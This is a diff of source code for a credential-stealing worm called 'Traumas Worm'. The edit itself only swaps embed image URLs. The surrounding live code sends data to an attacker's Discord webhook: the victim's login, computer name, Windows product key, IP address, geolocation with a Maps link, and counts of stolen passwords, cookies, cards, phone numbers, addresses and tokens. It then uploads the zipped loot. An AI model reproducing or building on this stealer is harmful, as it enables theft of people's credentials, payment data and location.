@@ -611,30 +611,30 @@ Antivirus: {avlist}
         embed = {
             "username": f"{os.getlogin()} | Trauma Developed By veal#0001",
             "content": "@everyone",
-            "avatar_url":"https://tenor.com/view/40-hood-gif-4673309",
+            "avatar_url":"https://cdn.discordapp.com/attachments/1076573898310701059/1087523084254330890/giphy.gif",
             "embeds": [
                 {
                     "author": {
                         "name": "Traumas Worm",
                         "url": "https://artofzoo.com",
-                        "icon_url": "https://tenor.com/view/40-hood-gif-4673309"
+                        "icon_url": "https://cdn.discordapp.com/attachments/1076573898310701059/1087523084254330890/giphy.gif"
                     },
                     "description": f'**{os.getlogin()}** ran Trauma.\n\n**Computer Name:** {os.getenv("COMPUTERNAME")}\n**{wname}:** {wkey if wkey else "No Product Key!"}\n**IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n**City:** {city}\n**Region:** {region}\n**Country:** {country}\n[Google Maps Location]({googlemap})\n```{self.fileCount}{self.files}\n\n│ Stats\n│ Passwords Found: {self.stats["passwords"]}\n│ Cookies Found: {self.stats["cookies"]}\n│ Phone Numbers Found: {self.stats["phones"]}\n│ Cards Found: {self.stats["cards"]}\n│ Addresses Found: {self.stats["addresses"]}\n│ Tokens Found: {self.stats["tokens"]}\n│ Time: {"{:.2f}".format(time.time() - self.starttime)}s```',
                     "color": 0x00000,
                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                     "thumbnail": {
-                      "url": "https://tenor.com/view/40-hood-gif-4673309"
+                      "url": "https://cdn.discordapp.com/attachments/1076573898310701059/1087523084254330890/giphy.gif"
                     },
                      "footer": {
                         "text": "Traumas Worm",
-                        "icon_url": "https://tenor.com/view/40-hood-gif-4673309"
+                        "icon_url": "https://cdn.discordapp.com/attachments/1076573898310701059/1087523084254330890/giphy.gif"
                     }
                 }
             ]
         }
         fileEmbed = {
             "username": f"{os.getlogin()} | Trauma Developed veal#0001",
-            "avatar_url":"https://tenor.com/view/40-hood-gif-4673309"
+            "avatar_url":"https://cdn.discordapp.com/attachments/1076573898310701059/1087523084254330890/giphy.gif"
         }
         with open(_zipfile,'rb') as infozip:
             requests.post(self.webhook, json=embed)
